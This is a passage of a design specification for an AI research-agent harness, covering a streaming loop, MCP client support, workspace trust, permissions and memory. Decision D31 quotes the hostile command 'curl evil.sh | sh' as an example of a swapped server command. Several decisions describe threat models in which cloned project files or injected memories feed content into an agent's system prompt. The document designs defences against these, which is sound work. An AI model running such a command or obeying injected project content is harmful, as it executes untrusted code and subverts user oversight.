# Roadmap v2 — Major Feature Expansion (Revision 3)

**Purpose of this document:** a complete, no-design-decisions-left specification for the next major version of the Venastine Research Harness. This document covers five interconnected feature areas: a streaming event-driven loop, a Textual TUI, MCP client support, an agent/subagent system, a skill system, and a project/user memory system — all unified by a markdown-based configuration format for agents, skills, and project settings.

**Revision history — Revision 2.** The original draft (Revision 1) was reviewed in full — cross-checked against the actual current codebase, verified with a web search where a specific library's behavior mattered, and independently audited by a second tool-assisted review pass. That review surfaced 13 critical findings and 16 suggestions, several of which pointed at the same underlying issues from different angles. This revision resolves what could be resolved and clearly flags what's still open — see "Open Questions" near the end, which was the most important section for anyone picking it up fresh.

**This is Revision 3.** Rev. 2's own open items were taken as the work list and closed against evidence rather than judgement, in the two ways this project already treats as authoritative: executing against the real codebase, and checking current library documentation. Rev. 3 changes fall into three groups.

*Regressions in Rev. 2's own code sketches, found by tracing them against the code they replace.* Rev. 2 was written as a specification, and three of its illustrative sketches quietly dropped behavior that the current implementation has and depends on — in each case behavior that a prior DEVLOG entry records as a deliberate bug fix. **§13's generator moved `memory.add_assistant_message()` below two early returns, re-opening the exact persistence bug `core/loop.py:50-59` carries a nine-line comment about**, and Rev. 2's acceptance criterion 1 (byte-for-byte identical `ModelResponse`) could not have caught it, because the return value is identical and only the persisted thread is wrong. **§15's `dispatch()` rewrite dropped the `check_output_policy()` call and the unknown-tool guard** — silently deleting the entire secret-redaction layer (ROADMAP §8) in a section whose subject is tightening permissions. **§13 named two public wrappers to convert and missed a third, `continue_conversation()`** — the JSON-retry entry point (ROADMAP §3), which §21 then builds its compaction retry on. These are marked **(Rev. 3, correction)** below. The general lesson is recorded in the "Why" section: a specification that restates existing code in abbreviated form silently proposes deleting whatever it abbreviates away.

*Items Rev. 2 explicitly deferred as unverifiable, now verified.* The test-count question in §13's AC4 is settled (8 test functions, 11 call sites, exact list inline). Open Question 6's MCP SDK shapes are settled, and the answer changed the section: **the `mcp` package is mid-major-version-transition right now, and the SDK's own README instructs dependents to add a `<2` upper bound** — while Rev. 2's dependency table listed `mcp` as the one new dependency with no pin. Two further consequences of reading the real client API — result-shape normalization and session lifetime — are new §17 subsections.

*One live bug in the shipped harness, found incidentally.* `fetch_url` is registered in `tools/registry.py` but has no field in `config.ToolPermissions`, so `is_tool_allowed("fetch_url")` returns `False` and every call to it has always been denied. This is the same class of defect ARCHITECTURE.md §441 already records ("importing a tool module is not the same as making it callable") reappearing one layer down, and §15 is where it gets a permanent structural fix.

**Open Questions is now empty.** Rev. 2 carried six. Three were closed by verification (context-window sourcing, MCP call shapes, the test count) and three by the project owner's decision (**D25** memory scope defaults to `"project"`, **D26** `remember()` requires approval while `pin()` doesn't, **D27** compaction hyperparameters ship as user-overridable defaults rather than fixed constants). This document's opening claim — "a complete, no-design-decisions-left specification" — is now accurate rather than aspirational. What remains is implementation and two things to re-check against real code when the code exists.

**Relationship to ROADMAP.md:** the original ROADMAP.md (§1–§12) is fully built. This document continues the section numbering at §13. Where a section below modifies a file or pattern established in the original ROADMAP.md or ARCHITECTURE.md, it references the original section by number (e.g. "per ARCHITECTURE.md §4.7").

**Companion documents:** ARCHITECTURE.md (what's built), ROADMAP.md (original spec, all built), DEVLOG.md (implementation notes for §1–§12). When a section from this document is implemented, its corresponding entry here gets a "Built" subsection and DEVLOG.md gets a full decision record, same as the original roadmap.

**Section numbers below are stable** — other documents in this repo cross-reference them by number.

---

## Design Decisions Record

Every decision below was made through a structured clarification cycle with the project owner. These are locked — do not re-litigate without cause. Decisions marked **(Rev. 2)** were added or materially revised during the Revision 2 review; the original Revision 1 decision is noted where it changed.

| # | Decision | Choice | Rationale |
|---|---|---|---|
| D1 | Build order | Foundation (§13–§15) → TUI (§16) → MCP (§17) → Agents (§18) → Skills (§19) → Subagent review (§20) → Memory/compaction (§21) | Foundation enables everything else; TUI is highest user-visible value after foundation; MCP expands tool ecosystem; agents/skills depend on file syntax + permissions refactor |
| D2 | Streaming mechanism | Generator/yield with `run_to_completion()` backward-compat wrapper | Callbacks create debt when streaming tool-call args, composing consumers, or handling permission prompts inline. Generators are synchronous (no async needed) at the loop level, composable, and scale to all planned features. |
| D2a | **(Rev. 2)** MCP's inherent async nature | A dedicated background thread owns one persistent asyncio event loop for all MCP traffic; every MCP call is bridged into it via `asyncio.run_coroutine_threadsafe(...).result(timeout=...)`, so `_run()` and every tool handler stay plain synchronous functions | D2 said "no async needed" — true for the loop itself, but MCP's official Python SDK is async end-to-end with no sync surface at all (verified against current SDK docs, not assumed). Making tool dispatch async end-to-end to accommodate this would touch every existing file and invalidate the entire existing synchronous test suite, for a concurrency benefit nothing currently requires. A bridge, isolated to one new module, gets the same result at a fraction of the blast radius. |
| D3 | MCP scope | Client only (consume external MCP servers' tools) | Server mode is a different use case with different security implications. Defer until there's a concrete need. |
| D4 | MCP transports | stdio + HTTP/SSE | stdio for local servers (most common), HTTP/SSE for remote servers. Both are in the MCP spec. |
| D5 | Agent/skill file format | YAML frontmatter + markdown body | Matches ecosystem conventions (opencode agent.md, Claude Code AGENTS.md/skills). |
| D6 | Agent invocation | User-initiated (`/agent <name>`) + model-initiated (subagent spawning tool) | User needs direct control; model needs autonomy for complex tasks. |
| D7 | Skill activation | User-activated via slash command (`/skill <name>`) | Auto-detection adds complexity and unpredictability; can be added later. |
| D8 | File discovery locations | **(Rev. 4: tier ORDER amended, see D29)** Three tiers: harness (`agents/builtin/`, `skills/builtin/`, shipped with the harness itself) → project (`.venastine/`, only if trusted, see D17) → user (`~/.config/venastine/`) | Original was two-tier (project overrides user). A third, un-overridable harness tier was added specifically so a same-named project or user file can never impersonate a built-in agent/skill — see D18. |
| D9 | Subagent reviewing | Opt-in via config flag (`SUBAGENT_REVIEW = False`) | Significant cost/latency impact; default is off. |
| D10 | Default skills | Cybersecurity research, cryptography verification, proof writing, literature review | Covers the project's stated focus areas. |
| D11 | MCP config location | ~~Dedicated `mcp.json` at project root and user config dir~~ **(Rev. 4, AMENDED)** User-level stays `~/.config/venastine/mcp.json`; project-level is **`.venastine/mcp.json`**, NOT the project root | Matching Claude Code's root `.mcp.json` convention put the file *outside* the D17 trust boundary, which hashes only `.venastine/`. Worse, `is_trusted()` returns `True` outright when `.venastine/` is absent — so a root `mcp.json` in a repo with no `.venastine/` would have auto-spawned its `command` with no prompt at all, which is precisely the risk D17 was created to stop. Under `.venastine/` the existing hash, trust prompt and file listing cover it with no change to `workspace_trust.py`. |
| D12 | CLI fate | Permanent fallback — never removed | TUI is primary, but headless/CI/scripting use cases need the CLI to survive. |
| D13 | Streaming + TUI phasing | Streaming refactor is part of the foundation phase (§13), not the TUI phase | Agents and MCP also need streaming; building it once in the foundation avoids retrofitting. |
| D14 | Permission model | **(Rev. 2, revised)** "Stricter wins" — every active layer (global tool policy, active agent's overrides, every active skill's overrides, a tool's own dynamic `approval_check`) is consulted; a tool is allowed only if ALL layers agree (logical AND), approval is required if ANY layer says so (logical OR) | Original D14 only said "context-aware, per-agent overrides." Review found this under-specified two real conflicts: (a) a tool's existing `approval_check` mechanism was being silently bypassed by context-based checks, and (b) nothing stopped an agent/skill from being MORE permissive than the global default. "Stricter wins" resolves both without needing tool-by-tool special-casing. |
| D15 | Tool registry | Dynamic registration at runtime (not just import-time) | MCP tools and agent-scoped tools need runtime `register()`/`unregister()`. |
| D16 | Context/memory management | **(Rev. 2, fully redesigned, no longer "lower priority")** See §21 in full — compaction via a built-in summarizing agent, an always-intact archive, thread-scoped pinning, and user/project-scoped durable memory | Rev. 1's version was a thin placeholder (simple truncation). Rev. 2 replaces it entirely — see §21. |
| D17 | **(Rev. 2)** Workspace trust | Project-level `.venastine/` content (agents, skills, MCP config, `CONTEXT.md`) requires one-time explicit user confirmation before loading, keyed by resolved project path + a content hash, stored at user level (`~/.config/venastine/trusted_projects.json`) | Review found that project-level `mcp.json` can auto-execute arbitrary local commands on startup with zero confirmation, and project-level `CONTEXT.md`/agent files can inject content into every system prompt — both are real risks specifically because "project-level" commonly means "a directory you cloned or downloaded from someone else," not something you authored. Content-hash keying means changed content re-prompts rather than silently inheriting stale trust. |
| D18 | **(Rev. 2)** Harness-tier precedence | A same-named agent/skill at the harness tier can never be shadowed by a project or user file of the same name — a naming collision is rejected outright with a warning, not silently resolved by precedence | Ensures workspace-trust mistakes have a ceiling: even a fully-trusted malicious project can't impersonate a built-in agent. Zero cost to legitimate users, who can simply name their own agents/skills uniquely. |
| D19 | **(Rev. 2)** Project config format split | `.venastine/settings.json` for structured key-value settings (provider/model defaults, ensemble mode, etc.); a separate `.venastine/CONTEXT.md` for free-text project context, injected into an agent's system prompt only if that agent opts in via `use_project_context: true` | Rev. 1's single `config.md` mixed structured settings and free-text "notes" in one file under a name that collided conceptually with the existing `config.py`. Splitting by kind (JSON for settings, markdown for context) is a cleaner mental model and reuses the project's existing config/credentials-style separation philosophy. |
| D20 | **(Rev. 3)** Persist-before-branch is an invariant, not an implementation detail | `memory.add_assistant_message(response)` executes immediately after every `call_model*` return and *before* any stop-condition branch, in the generator exactly as in today's synchronous loop. Any future rewrite of `_run()` must preserve this ordering, and there is a test that fails if it doesn't | This ordering is load-bearing and was already fixed once (`core/loop.py:50-59`, DEVLOG §3): persisting only on the tool-calling path silently drops plain-text final answers and budget-truncated responses, so a thread resumed later is missing its last assistant turn, and ROADMAP §3's JSON-retry breaks because the malformed output it needs to correct was never written. Rev. 2's §13 sketch reintroduced it. Promoting it from "a comment in the code" to "a numbered decision with a regression test" is what stops the next rewrite from doing the same thing a third time. |
| D21 | **(Rev. 3)** Streaming must not silently degrade token accounting | `call_model_stream()` returns usage that is *either* real or explicitly absent. A stream that completes without usage data raises rather than reporting zero, and the OpenAI-compatible path opts into usage explicitly per provider capability (see §13) | Verified: OpenAI-compatible streaming returns no usage at all unless `stream_options={"include_usage": True}` is sent, and not every v1-compatible provider accepts that parameter (Mistral rejects it outright with HTTP 422 — and MISTRAL is in this project's own supported-provider list). Every usage read in `core/client.py` is a defensive `getattr(..., 0)`, so a missing usage object doesn't error — it reports zero. Zero tokens used means `max_total_tokens` is never reached, which disables the budget stop condition *and* §21's compaction trigger, both silently and both only in streaming mode. Failing loudly matches this project's established pattern (`credentials.py` raising rather than defaulting quietly). |
| D22 | **(Rev. 3; RESOLVED Rev. 4)** MCP dependency is version-pinned, and the boundary is treated as live. **The check was performed at implementation time and v2.0.0 had shipped (2026-07-28), so the pin is `mcp>=2.0,<3` and §17 targets v2, not v1.x.** | `requirements.txt` pins `mcp` to an explicit tested version with an upper bound. The v1.x client API (`ClientSession` + a transport context manager) is what §17's design targets; migrating to v2's unified `Client` is a deliberate follow-up, not something to absorb accidentally via an unpinned install | The `mcp` package is transitioning major versions right now, and the SDK's README explicitly instructs dependents to add a `<2` upper bound before v2 stable lands. Rev. 2's dependency table pinned `pyyaml` ("pin explicitly, even if already a transitive dependency") but left `mcp` — the one dependency actually mid-break — unpinned. v2 also collapses transport selection into a single `Client` and adds an in-memory transport, which is materially better for §17, so this is a migration to schedule rather than avoid. |
| D23 | **(Rev. 3; corrected Rev. 4)** MCP tool results are normalized at the bridge. **v2 spells the fields snake_case (`.content` / `.structured_content` / `.is_error`), and raises `MCPError` for protocol-level failures including timeout — so `_normalize()` must catch that too, not only read `is_error` in band.** | `MCPClient.call_tool()` converts the SDK's `CallToolResult` into the plain `dict` shape every other tool handler returns, including mapping `isError` into the same `{"error": ...}` convention the loop already understands | The SDK returns a pydantic `CallToolResult` (`.content` blocks, `.structuredContent`, `.isError`), not a dict. Everything downstream assumes a dict: `check_output_policy()` calls `result.get(key)` and would raise `AttributeError`, meaning MCP output would bypass or break secret redaction; `memory.add_tool_result()` would `str()` a pydantic repr into the thread. This is the "fix it at the producer, not the consumer" principle applied literally — one conversion at the boundary, versus every consumer learning about MCP types. |
| D24 | **(Rev. 3)** Every registered tool must have a declared permission | A registry-vs-`ToolPermissions`/`ToolApprovals` consistency check runs at import time and fails loudly on any registered tool with no declared field, rather than letting `getattr(..., False)` decide by omission | Found live in the current codebase: `fetch_url` is registered and documented as Working (ARCHITECTURE.md §423) but absent from `ToolPermissions`, so it has always been denied by policy. The failure mode is invisible — the tool's schema is still advertised to the model, the model still calls it, and the only symptom is a denial message inside a tool result. `_default_for_unknown_tool()` (§15) intentionally makes omission meaningful for MCP tools; that makes it *more* important that omission is never accidental for built-in ones. |
| D25 | **(Rev. 3, resolved)** Default scope for `remember()` | `"project"` when the model doesn't pass an explicit `scope`. The parameter stays explicit per call, so `"global"` remains one word away | The two error directions are not symmetric. A memory that should have been project-scoped but landed globally contaminates every later conversation with a stale fact about a codebase you may not be working in, and it is hard to spot because it presents as the model simply being confident. A memory that should have been global but landed project-scoped merely fails to appear somewhere useful, and the fix is to say it again. Defaulting narrow makes the recoverable mistake the common one. It also matches the granularity `.venastine/` and D17 already operate at, so "project" means the same thing here as everywhere else in the system. |
| D26 | **(Rev. 3, resolved)** Approval gating for `pin` / `remember` | `remember()` requires approval; `pin()` does not | They differ on the axis that already separates `write` from `read`. `pin()` is thread-scoped, reversible, and takes effect inside a conversation the user is actively watching — a wrong pin costs some context budget and nothing else. `remember()` writes something that outlives the thread and silently shapes conversations the user hasn't started yet, so a wrong or injected memory is both persistent and invisible at the moment it actually matters. See §21 for the two consequences this has (headless paths, and what to do if the prompt turns out to be too frequent). |
| D27 | **(Rev. 3, resolved)** Compaction hyperparameters | Ship reasonable defaults, don't treat them as settled, and make every one of them user-overridable through the existing settings mechanism (D19) rather than editable only in `config.py` | Real long threads answer this better than reasoning does, and unlike D25/D26 a wrong value is cheap and immediately visible. This is the same posture `config.py` already documents for `MAX_TOKEN_BUDGET` ("Placeholder default; tune based on actual usage patterns once you have real runs to look at"). Making them user-settable is what turns "we didn't decide" from a deferral into a feature: different models and different working styles genuinely want different values, so the tuning belongs with the user rather than in a constant they'd have to fork the harness to change. |
| D28 | **(Rev. 4)** Approval default for MCP tools | MCP tools are **allowed** by default (D14/§15) but **require approval** by default, with a per-server `autoApprove` opt-out. Implemented as a *base default* (`permissions.set_dynamic_approval_default`), never as a `ToolSpec.approval_check` | Allowed-by-default and trusted-by-default are different questions. An MCP server is third-party code the model can reach without the user ever naming it; the project tier is trust-gated but a user-level `mcp.json` auto-connects. The opt-out cannot live in `approval_check` because `approval_needed()` ORs those in and OR can only tighten — an opt-out expressed there would have been silently inert. Varying the base default keeps D14's one-way ratchet exactly intact. |
| D29 | **(Rev. 4)** Tier precedence is harness > **user** > project | Same-name collisions resolve to the user tier, for MCP servers, agents and skills alike. Harness still beats both (D18, unchanged). Non-colliding definitions from every tier all load — precedence only breaks same-name ties | D8's original order was project-over-user, the conventional "more specific config wins". That is the wrong default here, because "project" doesn't mean more specific — it means *it arrived with a directory you cloned*, which is D17's entire premise. A shadowed agent changes a prompt; a shadowed MCP server changes which local command runs under a name you already trust. **`settings.json` deliberately keeps project-over-user**: its values are displayed verbatim in the trust prompt, so they are consented to directly, whereas an agent/skill/server is a *named identity* whose danger is impersonation. |
| D30 | **(Rev. 4)** `mcp.json` validation is by connection, not by schema | Unrecognized keys are accepted and ignored (DEBUG-logged); a server is validated by connecting and calling `list_tools()`; per-server failures are named and skipped, never fatal | `settings.json` raises on unknown keys (§14 amendment 1) because every one of its keys changes behavior. `mcp.json` is routinely shared with Claude Desktop, Cursor and others, which carry keys this harness doesn't implement — failing startup over a decorative key is worse than ignoring it. What we can't understand about *what executes* still surfaces, as that server's connect failure. One stale entry must never make the harness unusable. |
| D31 | **(Rev. 4)** User-level MCP servers are acknowledged once | First time a user-level server is seen, show the command it will run and confirm; store name → hash of its config entry, so an edited command re-asks | Project-level servers are covered by D17. User-level ones had no gate at all, on the assumption you authored them — which is exactly wrong when an installer or another tool appended to the file. Content-hash keying is D17's pattern reused, so an acknowledgement of `npx pkg` can't silently carry over to `curl evil.sh \| sh` under the same name. |

---

## Index

- 13. Streaming refactor — generator/yield loop + `LoopEvent` types **(BUILT)**
- 14. File syntax + config loader — YAML frontmatter + `.md` discovery + workspace trust **(BUILT)**
- 15. Permission system refactor — context-aware permissions ("stricter wins") + dynamic tool registration **(BUILT)**
- 16. TUI — Textual app + widgets + slash commands + streaming integration **(BUILT)**
- 17. MCP client — stdio + HTTP/SSE + `mcp.json` + async bridge + workspace trust **(BUILT)**
- 18. Agent system — agent `.md` format + manager + subagent tool + per-agent scoping + intersection rule **(BUILT)**
- 19. Skill system — skill `.md` format + manager + activation + default skills **(BUILT)**
- 20. Subagent reviewing — opt-in post-pipeline review with consented correction **(BUILT)**
- 21. Memory system — compaction, archive, thread-scoped pinning, user/project memory **(BUILT: §21a + §21b + §21c)**
- 22. Pipeline observability — orchestrator events + the live research view **(added during §16; BUILT)**
- 23. Interactive tools — question tool, todo list, and the response channel they share **(added during §16; BUILT — slice 1 was the channel, its three consumers and §18's deferred per-tool sign-off; slice 2 shipped `ask_user` and `todo_write`, covered by `test_question_tool.py` and `test_todo.py`)**
- 24. `/init` — generate the project's documentation set **(added during §16; BUILT)**
- 25. Authorized tool use in the research pipeline **(BUILT)**
- 26. Research legibility — pass internals, code stages, the claims view, colour, copy **(added after §22's first live run; BUILT)**
- 27. Thread legibility — thread `kind`, chat-only picker, transcript replay on resume **(added after §26's first live session; BUILT)**
- **Open Questions — None Remaining** (Rev. 3 — all decisions locked; verification items only)
- **Why these calls, not just what they are** (Rev. 3 — the reasoning patterns behind several decisions above)

---

## 13. Streaming refactor — generator/yield loop + `LoopEvent` types

**Problem:** `RunAgentLoop._run()` currently runs a whole multi-turn tool-calling loop to completion and returns one final `ModelResponse`. Nothing outside it can observe progress — token deltas, tool calls starting/finishing, permission prompts — while it's happening. Every planned feature (TUI live rendering, subagent observability, MCP tool call visibility) needs this.

### New file: `core/events.py`

```python
from dataclasses import dataclass, field
from typing import Optional, Any

@dataclass
class LoopEvent:
    """One event yielded by RunAgentLoop._run() as it progresses. Exactly
    one of the fields below is meaningfully populated per event, matching
    what happened at that point in the loop."""
    token_delta: Optional[str] = None
    tool_call_start: Optional[dict] = None      # {"id", "name", "input"}
    tool_result: Optional[dict] = None           # {"id", "result"}
    permission_request: Optional[dict] = None    # {"tool_name", "params"} -- see below
    final_response: Optional[Any] = None         # the ModelResponse, set on the terminal event
    stop_reason: Optional[str] = None            # "complete" | "max_steps_reached" | "token_budget_exceeded"
```

**Note on error handling (S11, resolved):** there is deliberately no `error` variant on `LoopEvent`. Exceptions raised mid-loop propagate naturally out of the generator, unchanged from the current (non-streaming) behavior. This matters concretely: `orchestrator.py`'s existing failure-path persistence (`except Exception: update_pipeline_run(..., status="failed"); raise`) depends on a real exception propagating — converting failures into a data-shaped event would require every consumer, including that already-built and tested code, to know to unpack and re-raise it. Consumers that want graceful error display (the TUI) wrap their own consumption loop in `try/except` and translate what they catch into UI, rather than the loop itself deciding how errors get presented.

### `core/loop.py` changes

`_run()` becomes a generator. The critical correctness point Rev. 1's sketch got wrong: **the terminal `yield` + `return` must only happen on an actual stop condition** — task complete, budget exceeded, or `max_steps` exhausted — never unconditionally at the end of each loop iteration. Getting this wrong silently breaks multi-turn tool-calling entirely (the loop would stop after exactly one iteration regardless of pending tool calls).

```python
@staticmethod
def _run(memory, system_prompt, provider_name, model, allowed_tools,
         max_steps, max_total_tokens=None, temperature=None,
         permission_channel=None):
    """
    permission_channel: an optional queue.Queue (plain stdlib, NOT
    asyncio -- this is a thread-to-thread handoff between the TUI's
    worker thread running this generator and the TUI's main/UI thread,
    not a bridge to an async subsystem; see §17 for why MCP needs a
    genuinely different mechanism). If None (CLI/pipeline paths), any
    tool call that would need approval is denied by default -- same
    behavior as today's dispatch() with no approval_callback.
    """
    client = api_initialization(provider_name)
    tool_schemas = registry.schemas(allowed_tools)
    total_tokens_used = 0

    for _ in range(max_steps):
        response = None
        for token in call_model_stream(client, provider_name, model, memory.messages,
                                        system_prompt, tool_schemas, temperature):
            if token.text_delta:
                yield LoopEvent(token_delta=token.text_delta)
            if token.final_response is not None:
                response = token.final_response

        total_tokens_used += response.usage.get("input_tokens", 0) + response.usage.get("output_tokens", 0)

        # (Rev. 3, correction -- D20) Persist EVERY assistant turn BEFORE any
        # branching, exactly as the current synchronous loop does. Rev. 2's
        # sketch had this call below both early returns, which silently
        # reintroduces the bug core/loop.py:50-59 documents at length:
        # plain-text final answers and budget-truncated responses never
        # reach MessageLog, so a thread resumed via
        # ConversationMemory(thread_id=...) is missing its last assistant
        # turn, and ROADMAP §3's JSON-retry has no malformed output to
        # correct. Note this is invisible to a test that only compares the
        # returned ModelResponse -- see acceptance criterion 6.
        memory.add_assistant_message(response)

        if max_total_tokens is not None and total_tokens_used >= max_total_tokens:
            response.stop_reason = "token_budget_exceeded"
            yield LoopEvent(final_response=response, stop_reason=response.stop_reason)
            return  # correctly gated -- budget genuinely exceeded

        if not response.tool_calls:
            response.stop_reason = "complete"
            yield LoopEvent(final_response=response, stop_reason=response.stop_reason)
            return  # correctly gated -- task genuinely complete

        for call in response.tool_calls:
            yield LoopEvent(tool_call_start={"id": call.id, "name": call.name, "input": call.input})

            if allowed_tools is not None and call.name not in allowed_tools:
                result = {"error": f"{call.name} is not available in this context"}
            else:
                needs_approval = requires_approval(call.name, call.input)  # "stricter wins" -- see §15
                if needs_approval:
                    yield LoopEvent(permission_request={"tool_name": call.name, "params": call.input})
                    approved = permission_channel.get() if permission_channel is not None else False
                    if not approved:
                        result = {"error": f"{call.name} requires approval and was not given"}
                    else:
                        result = registry.dispatch(call.name, call.input)
                else:
                    try:
                        result = registry.dispatch(call.name, call.input)
                    except ToolCallDenied as e:
                        result = {"error": str(e)}

            yield LoopEvent(tool_result={"id": call.id, "result": result})
            memory.add_tool_result(call.id, result)
        # loop continues to next iteration -- NOT gated by a yield/return here

    # max_steps exhausted without an earlier return
    response.stop_reason = "max_steps_reached"
    yield LoopEvent(final_response=response, stop_reason=response.stop_reason)
```

`run_to_completion(gen)` lives in **`core/loop.py`, not a separate module** (settling Rev. 1's own open question, S16) — it's tightly coupled to `_run()`'s exact generator shape and has no reason to live anywhere else; placing it elsewhere risked a circular import (C8) for no benefit.

```python
def run_to_completion(gen) -> ModelResponse:
    """Consumes a _run() generator fully, discarding intermediate events,
    and returns the final ModelResponse -- this is what keeps
    run_agent_conversation()/run_deep_research_mode() backward compatible
    with every existing caller."""
    final = None
    for event in gen:
        if event.final_response is not None:
            final = event.final_response
    return final
```

**(Rev. 3, correction)** There are **three** public wrappers calling `_run()`, not two. Rev. 2 named `run_agent_conversation()` and `run_deep_research_mode()` and missed **`continue_conversation()`** (`core/loop.py:139-169`) — which is the one that matters most to the rest of this document, because it is the entry point ROADMAP §3's JSON-retry uses to send a corrective follow-up into an existing thread, and §21 builds its compaction-retry loop on that same mechanism. All three become thin wrappers: build the generator, pass it to `run_to_completion()`, return the result. Their public signatures are unchanged.

Missing it would not have been subtle at runtime — each wrapper does `response.thread_id = ...` on the return value, and generator objects reject attribute assignment, so it fails with `AttributeError: 'generator' object has no attribute 'thread_id'` on first use. It would, however, have been missed by anyone working section-by-section from the file list, which is the actual risk: §21 depends on a retry path this document never mentioned converting.

### `core/client.py` changes

`call_model_stream()` is a new generator-based sibling to `call_model()`, yielding token-level events from the underlying SDK's streaming API for each provider. `collect_response(gen)` (a small helper, analogous to `run_to_completion`) drains it into a single `ModelResponse` for any caller that doesn't need streaming.

**(Rev. 3) This is three implementations, not one, and it is the largest under-estimate in Rev. 2.** `call_model()` is ~100 lines across three branches — `ANTHROPIC`, `GOOGLE`, and an OpenAI-compatible path that every other provider in `providers.json` routes through via `is_v1_compatible`. Each branch reads tool calls and usage out of a different response shape, and each streams differently: Anthropic emits typed events (`content_block_delta`, with usage split across `message_start` and `message_delta`), Google yields chunked candidates, and the OpenAI path yields choice deltas whose `tool_calls` arrive as *fragments that must be accumulated by index* rather than as complete objects. `call_model_stream()` must produce a `ModelResponse` identical to what `call_model()` produces for the same inputs, per provider — treat that equivalence as the acceptance bar, not "tokens appear."

**Usage reporting in streaming mode is a verified trap (D21).** Three separate facts compound:

1. **OpenAI-compatible streaming returns no usage at all** unless the request sends `stream_options={"include_usage": True}`. With it, usage arrives on one extra final chunk whose `choices` array is empty, and is `null` on every earlier chunk.
2. **Not every v1-compatible provider accepts that parameter.** Mistral rejects it with HTTP 422 `extra_forbidden` — and `MISTRAL` is in this project's own supported-provider list in `providers.json.example`. So it cannot simply be sent unconditionally on the shared OpenAI-compatible path; it needs a per-provider capability flag in `providers.json` (`supports_stream_usage`, defaulting conservatively), which is the same shape as the existing `is_v1_compatible` flag.
3. **Every usage read in `core/client.py` is a defensive `getattr(usage_obj, "...", 0)`.** Missing usage therefore does not raise — it reports zero.

Together those mean a plausible first implementation of streaming makes `total_tokens_used` stay at 0 forever, which silently disables the `max_total_tokens` stop condition and, later, §21's entire compaction trigger — with no error, no warning, and correct-looking output. Per D21, `collect_response()` raises when a stream completes without usage data on a provider marked as supporting it, rather than passing zeros through. If the stream is interrupted or cancelled the final usage chunk may never arrive, so that path must be distinguishable from "provider doesn't report usage."

### Acceptance criteria

1. `run_to_completion(RunAgentLoop._run(...))` produces byte-for-byte the same `ModelResponse` the current non-generator `_run()` produces, for the same inputs — this is the regression test that would have caught Rev. 1's yield/return placement bug had it shipped as written.
2. A multi-turn scenario (tool call → result → follow-up call → final answer) yields events in the correct order and does NOT terminate early.
3. All three stop conditions (complete, budget exceeded, max_steps) each yield exactly one terminal event with the correct `stop_reason`.
4. **Every existing test that calls `RunAgentLoop._run()` directly (not through the public wrapper methods) is updated to wrap the call in `run_to_completion()`.** **(Rev. 3, verified — the count was flagged in Rev. 2 as unconfirmed and is now confirmed by AST-walking the suite.)** The "8 tests" estimate was correct. The exact inventory, so this doesn't need re-deriving:

   | File | Test function |
   |---|---|
   | `tests/test_loop_stop_conditions.py` | `test_stop_condition_1_task_complete_no_tool_calls` |
   | `tests/test_loop_stop_conditions.py` | `test_stop_condition_2_max_steps_call_count_equals_max_steps` |
   | `tests/test_loop_stop_conditions.py` | `test_stop_condition_3_token_budget_exceeded_first_call` |
   | `tests/test_loop_tool_dispatch.py` | `test_single_tool_call_dispatches_and_feeds_result_to_memory` |
   | `tests/test_loop_tool_dispatch.py` | `test_two_tool_calls_in_one_response_dispatch_each_in_order` |
   | `tests/test_loop_tool_dispatch.py` | `test_disallowed_tool_name_skips_dispatch_and_feeds_error_result` |
   | `tests/test_loop_tool_dispatch.py` | `test_registry_dispatch_raises_ToolCallDenied_caught_and_recorded_as_error` |
   | `tests/test_loop_tool_dispatch.py` | `test_allowed_tools_none_permits_every_tool` |

   8 test functions, 8 call sites in tests, plus 3 production call sites in `core/loop.py` (the three wrappers above) — 11 total. `tests/test_json_retry.py` references `_run()` heavily in comments but calls it only through `run_deep_research_mode`/`continue_conversation`, so it needs no edit for this, though see criterion 6. Both affected test modules build kwargs through a helper (`_make_run_kwargs` / `_build_run_inputs`), so `_run()` gaining `permission_channel` and `tool_context` does not break them — only the generator conversion does. `tests/BREAKING_CHANGES.md` §68 already anticipates this and should be updated alongside.
5. A mid-loop exception (e.g. a tool raising an unexpected error) propagates out of the generator to the caller, unchanged from current non-streaming behavior.
6. **(Rev. 3, D20) A persistence-ordering regression test that inspects `MessageLog`, not the return value.** After a run ending in a plain-text answer, and after a run cut short by `token_budget_exceeded`, the thread's persisted history must contain that final assistant turn. Criterion 1 (byte-for-byte identical `ModelResponse`) passes even when this is broken, which is exactly why Rev. 2's sketch shipped the regression unnoticed — the returned object is correct and only the database is wrong. `tests/test_memory_write_through.py` is the natural home.
7. **(Rev. 3, D21) A streaming run reports non-zero token usage on every provider marked as supporting usage reporting**, and a provider not marked as supporting it never receives `stream_options`. Assert on `total_tokens_used` advancing, not just on the response body — a budget silently pinned at 0 is the failure this is guarding.

---

## 14. File syntax + config loader — YAML frontmatter + `.md` discovery + workspace trust

### File discovery locations (three tiers, per D8/D18)

```
agents/builtin/*.md, skills/builtin/*.md   # shipped WITH the harness; never overridden by anything (D18)
.venastine/agents/*.md, .venastine/skills/*.md   # project-level; requires workspace trust (D17)
.venastine/settings.json                    # project-level structured settings; requires workspace trust
.venastine/CONTEXT.md                       # project-level free-text context; requires workspace trust
.venastine/mcp.json                         # project-level MCP server config; requires workspace trust
~/.config/venastine/agents/*.md, skills/*.md, settings.json, mcp.json   # user-level; always trusted (you authored it)
```

**Discovery precedence:** harness → project (only if trusted) → user. A name collision AT THE HARNESS TIER is rejected outright with a warning — not silently shadowed — per D18. A name collision between project and user tiers still resolves project-wins, per the original D8 (this is a much lower-stakes case since neither can impersonate a built-in). **AMENDED BY D29 (§17): user beats project**, for agents, skills and MCP servers alike -- "project" does not mean "more specific", it means "it arrived with a directory you cloned", so the tier you merely trusted once must not silently displace the one you authored. `settings.json` deliberately keeps project-over-user, because its values are shown verbatim in the trust prompt and consented to directly.

### Workspace trust (new, D17)

```python
# core/workspace_trust.py

import hashlib
import json
import os

TRUST_STORE_PATH = os.path.expanduser("~/.config/venastine/trusted_projects.json")

def _content_hash(project_venastine_dir: str) -> str:
    """Hashes the concatenated content of every file under .venastine/ in
    a project -- agents, skills, settings.json, CONTEXT.md, mcp.json.
    Changed content after trust was granted produces a different hash,
    which re-triggers the prompt rather than silently inheriting stale trust.

    (Rev. 3) Two corrections to the obvious implementation, both of which
    matter because this hash is a security control rather than a cache key:

      1. `os.walk` yields subdirectories in filesystem order, not sorted
         order. Sorting `files` alone is not enough -- `dirs` must be
         sorted IN PLACE so os.walk itself descends deterministically,
         or the same unchanged .venastine/ can hash differently between
         runs and re-prompt for trust that was already granted. Users who
         are re-prompted for no visible reason learn to approve without
         reading, which defeats the control entirely.
      2. Hashing file CONTENT only means the path is invisible to the
         hash. Two files swapping names, or a file moving between
